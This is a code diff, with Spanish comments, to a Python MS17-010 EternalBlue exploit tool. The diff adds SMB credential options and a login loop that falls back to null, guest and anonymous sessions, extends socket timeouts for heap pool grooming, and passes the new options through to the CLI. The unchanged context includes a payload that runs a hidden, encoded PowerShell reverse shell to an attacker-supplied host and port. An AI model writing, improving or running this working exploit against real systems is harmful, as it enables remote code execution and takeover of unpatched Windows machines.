@@ -791,7 +791,7 @@ def _service_exec(conn, cmd):
             pass
 
 
-def _eternalblue_exploit(target, port, cmd, timeout=60):
+def _eternalblue_exploit(target, port, cmd, timeout=60, user='', password='', domain=''):
     """
     Exploit completo de EternalBlue portado a Python 3.
 
@@ -824,29 +824,43 @@ def _eternalblue_exploit(target, port, cmd, timeout=60):
     # Capturar OS antes del login (viene en la negociación SMB)
     server_os = conn.get_server_os()
 
+    # Intentar login nulo. Si falla, parchear el UID a 0xFFFF (valor que impacket
+    # usa internamente para sesiones nulas en SMB1 sin extended security).
+    # login() con usuario/password vacíos hace NULL SESSION (SMB1).
+    # Intentar primero login_standard (sin extended security NTLMSSP),
+    # luego login() genérico. Si ambos fallan, continuar igualmente:
+    # el exploit EternalBlue puede funcionar incluso sin SESSION_SETUP
+    # completado porque opera a nivel de paquetes SMB raw.
+    # Intentar credenciales en orden: las indicadas, luego fallbacks comunes.
+    # En 2012 R2 la null session pura falla pero guest/''/anonymous suelen funcionar.
     login_ok = False
-    for user, passwd in [('', ''), ('guest', ''), ('anonymous', '')]:
+    cred_candidates = [(user, password, domain)] if (user or password) else []
+    cred_candidates += [
+        ('', '', ''),
+        ('guest', '', ''),
+        ('anonymous', '', ''),
+    ]
+    login_who = ''
+    for u, p, d in cred_candidates:
         try:
-            conn.login(user, passwd)
+            conn.login_standard(u, p, domain=d)
             login_ok = True
+            login_who = f"{d}\\{u}" if d else (u or "null session")
+            break
+        except Exception:
+            pass
+        try:
+            conn.login(u, p, domain=d)
+            login_ok = True
+            login_who = f"{d}\\{u}" if d else (u or "null session")
             break
         except Exception:
             pass
 
-    if not login_ok:
-        # Reconectar limpio: impacket deja el UID en estado inválido si login falla.
-        # Una nueva conexión sin intentar login deja la sesión en estado nulo válido.
-        try:
-            conn.get_socket().close()
-        except Exception:
-            pass
-        try:
-            conn = MYSMB(target, int(port), timeout=timeout)
-            conn.get_socket().setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        except Exception as e:
-            console.print(f"  [red]✗ No se pudo reconectar: {e}[/red]")
-            return False
-        console.print(f"  [dim]Sesión nula sin autenticación[/dim]")
+    if login_ok:
+        console.print(f"  [dim]Login OK: {login_who}[/dim]")
+    else:
+        console.print("  [dim]Login rechazado — continuando con sesión anónima raw[/dim]")
     console.print(f"  [dim]SO detectado: {server_os}[/dim]")
 
     info = {}
@@ -888,6 +902,12 @@ def _eternalblue_exploit(target, port, cmd, timeout=60):
     console.print(f"  [dim]Usando pipe: {pipe_name}[/dim]")
 
     console.print("  [dim]Iniciando pool grooming...[/dim]")
+    # El grooming envía/recibe muchos paquetes; subir el timeout del socket
+    # para que ningún recv individual expire durante la operación.
+    try:
+        conn.get_socket().settimeout(300)
+    except Exception:
+        pass
     try:
         ok = info['method'](conn, pipe_name, info)
     except Exception as e:
@@ -961,7 +981,7 @@ def run_check(target, port, timeout):
         console.print(f"  [dim]Comprueba que el puerto {port} esté abierto y SMBv1 activo[/dim]")
 
 
-def run_exploit(target, port, payload, cmd, lhost, lport, timeout):
+def run_exploit(target, port, payload, cmd, lhost, lport, timeout, user='', password='', domain=''):
     console.print(f"\n  [bold red]MS17-010 — EternalBlue exploit[/bold red]")
     console.print(f"  [dim]Objetivo: {target}:{port}[/dim]")
     console.print(f"  [dim]Payload: {payload}[/dim]\n")
@@ -982,7 +1002,7 @@ def run_exploit(target, port, payload, cmd, lhost, lport, timeout):
             console.print("  [red]✗ --cmd requerido para payload 'cmd'[/red]")
             return
         console.print(f"  [dim]Comando: {cmd}[/dim]\n")
-        _eternalblue_exploit(target, port, cmd, timeout)
+        _eternalblue_exploit(target, port, cmd, timeout, user=user, password=password, domain=domain)
 
     elif payload == "shell":
         if not lhost or not lport:
@@ -991,7 +1011,7 @@ def run_exploit(target, port, payload, cmd, lhost, lport, timeout):
         console.print(f"  [dim]Reverse shell → {lhost}:{lport}[/dim]\n")
         ps_enc = _build_ps_reverse_shell(lhost, int(lport))
         ps_cmd = f"cmd /c powershell -nop -w hidden -enc {ps_enc}"
-        _eternalblue_exploit(target, port, ps_cmd, timeout)
+        _eternalblue_exploit(target, port, ps_cmd, timeout, user=user, password=password, domain=domain)
 
     else:
         console.print(f"  [red]✗ Payload desconocido: {payload}[/red]")
@@ -1036,6 +1056,9 @@ def build_parser():
     p.add_argument("--cmd", default=None)
     p.add_argument("--lhost", default=None)
     p.add_argument("--lport", default=4444, type=int)
+    p.add_argument("-u", "--user",     default="", help="Usuario SMB (vacío = sesión nula)")
+    p.add_argument("-p", "--password", default="", help="Contraseña SMB")
+    p.add_argument("-d", "--domain",   default="", help="Dominio")
     return parser
 
 
@@ -1080,7 +1103,8 @@ def main():
             run_exploit(args.target, args.port,
                         args.payload, args.cmd,
                         args.lhost, args.lport,
-                        args.timeout)
+                        args.timeout,
+                        user=args.user, password=args.password, domain=args.domain)
 
 
 if __name__ == "__main__":
